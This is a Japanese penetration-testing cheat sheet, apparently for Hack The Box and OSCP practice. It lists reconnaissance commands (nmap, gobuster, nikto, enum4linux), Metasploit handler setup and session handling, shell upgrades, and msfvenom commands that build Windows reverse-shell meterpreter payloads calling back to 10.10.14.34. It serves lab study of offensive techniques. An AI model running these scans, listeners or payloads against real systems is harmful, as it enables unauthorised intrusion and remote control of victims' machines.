
---

# 共通

## 偵察

### 通信相手のOSを知る
```bash
ping -c 1 <IP>
````

- ttlの時間で判別する
    - `ttl=64` → Linux OS/Mac OS
    - `ttl=128` → Windows OS
    - `ttl=255` → UNIX OS/ネットワーク機器

---

### ポートスキャン

```bash
sudo nmap -vvv -sCV -T4 -p0-65535 -Pn <IP>
```

### CMS、JavaScriptライブラリ、ウェブサーバ、バージョン番号、ウェブフレームワークの取得

```bash
sudo whatweb http://<IP>
```

---

### Webサーバ上のディレクトリ列挙

- 特定のページにアクセスできる隠しファイルやフォルダを見つけるのに最適

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

- **ワードファイル候補**

```
/usr/share/wordlists/dirb/big.txt
```

---

### サブドメインの列挙

```bash
gobuster dns -d <IP> -w /usr/share/wordlists/subdomains.txt
```

---

### VHOST（仮想ホスト）の列挙

```bash
gobuster vhost -u http://<IP> -w /usr/share/wordlists/vhosts.txt
```

---

### サイト脆弱性スキャン

```bash
nikto -h http://<IP>
```

### FTP匿名ログイン

```bash
ftp <IP>
```

- ユーザー名: `anonymous` または `ftp`
- パスワード: 空欄でEnter

---


## Webサイト情報取得

### Burp Suiteのブラウザで確認

### `curl`での確認

`md`ファイルなどはブラウザよりも`curl`での確認が見やすい。

```bash
curl -k <URL>
```

- `-k`：エラーを無視するオプション

## Exploit
### Metasploit 

#### リバースシェルリスナーの設置


```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
set ExitOnSession false
exploit -j -z
```




---

#### **セッション管理**

#### **セッション一覧表示**

```bash
sessions -l
```

#### **セッション接続・セッションに戻る**

```bash
sessions -i <セッション番号>
```

####  **セッション全終了**
se
```bash
sessions -K
```


---

#### **特権昇格の発見とエクスプロイト**

##### **local_exploit_suggester を使う**

Mesterpreterでユーザー権限でセッションが確立している時、**`local_exploit_suggester`** モジュールを使用して、ターゲットシステムに適した特権昇格エクスプロイトを提案させることができます。

```bash
use post/multi/recon/local_exploit_suggester
```

---




---



## 脆弱性の探索

### XSS (Cross Site Script)

HTBやOSCPではXSSの脆弱性を使うことはないため、真っ先に除外する。  
XSSは他のユーザーが引っかかる必要があるが、HTBやOSCPには対象が存在しない。

---

### シェルアップデート
- linux
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
- windows
- 方法 : rlwrap は、コマンドラインの入力履歴や補完機能を提供するラッパープログラムです。これを nc と組み合わせることで、シェルの機能を強化できます。

```bash
rlwrap nc -lvnp <ポート番号>  # リスナー側 (攻撃者マシン)
```

---

# Windows固有

### TCPポート 445・TCP/UDPポート 139が空いている場合

- **NmapでSMBの脆弱性をスキャン**

```bash
nmap --script=smb-vuln* <IP>
```


---

### Sambaを介して共有情報を取得

- **enum4linuxツール**  
    Sambaを介して情報を抽出できるツール。
- 取得できる情報:
    - グループメンバーシップ情報
    - 共有情報
    - ワークグループまたはドメインメンバーシップ
    - リモートオペレーティングシステムの識別
    - パスワードポリシーの取得

---

### Windows検索
- Cディレクトリを再帰的に検索
- 大文字も小文字も関係なく検索

```bash
dir /s /b C:\user.txt
```


```bash
dir /s /b C:\root.txt
```


---

### **Msfvenom Windowsペイロード作成**

#### **32ビット用ペイロード生成**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=8888 -f aspx > shell2.aspx
```

#### **64ビット用ペイロード生成**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=1234 -f exe > stageless_payload_x64.exe
```

---

